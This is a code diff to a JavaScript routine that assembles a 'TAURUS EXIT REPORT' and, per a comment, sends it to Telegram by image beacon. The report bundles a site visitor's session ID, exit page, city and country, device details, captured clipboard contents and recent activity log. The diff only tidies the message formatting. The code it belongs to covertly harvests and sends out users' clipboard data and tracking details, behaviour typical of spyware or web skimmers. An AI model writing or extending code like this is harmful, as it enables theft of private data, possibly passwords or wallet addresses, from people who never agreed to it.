@@ -87,7 +87,16 @@
         const rawLog = localHistory.slice(-20).join('\n').substring(0, 1200);
 
         // 2. Build Comprehensive Telegram Message (SINGLE MESSAGE)
-        const separator = `━━━━━━━━━━━━━━━━━━━━━━━`;
+        const separator = `━━━━━━━━━━━━━━━━━━━━━`;
+
+        // Smart clipboard formatting - avoid pre tag for "None"
+        const clipboardContent = escapeHTML(clipboardEntries) || '';
+        const clipboardDisplay = clipboardContent ? `<pre>${clipboardContent}</pre>` : 'None';
+
+        // Smart event log formatting
+        const logContent = escapeHTML(rawLog) || '';
+        const logDisplay = logContent ? `<pre>${logContent}</pre>` : 'No events';
+
         const tgMsg = `🛑 <b>TAURUS EXIT REPORT</b>\n` +
             `${separator}\n` +
             `🆔 <b>SESSION:</b> <code>${sessionID}</code>\n` +
@@ -95,8 +104,8 @@
             `📍 <b>EXIT PAGE:</b> <code>${window.location.pathname}</code>\n` +
             `🌍 <b>LOCATION:</b> <code>${sessionData?.city || 'Unknown'}, ${sessionData?.country_name || ''}</code>\n` +
             `💻 <b>DEVICE:</b> <code>${sessionData?.device?.model || 'Unknown'} (${sessionData?.device?.os || 'Unknown'})</code>\n\n` +
-            `📋 <b>CLIPBOARD:</b>\n<pre>${escapeHTML(clipboardEntries) || 'None'}</pre>\n` +
-            `📝 <b>EVENT LOG:</b>\n<pre>${escapeHTML(rawLog) || 'No events'}</pre>\n` +
+            `📋 <b>CLIPBOARD:</b>\n${clipboardDisplay}\n` +
+            `📝 <b>EVENT LOG:</b>\n${logDisplay}\n` +
             `${separator}`;
 
         // 3. Send to Telegram via Image Beacon (Immediate, 100% reliable)
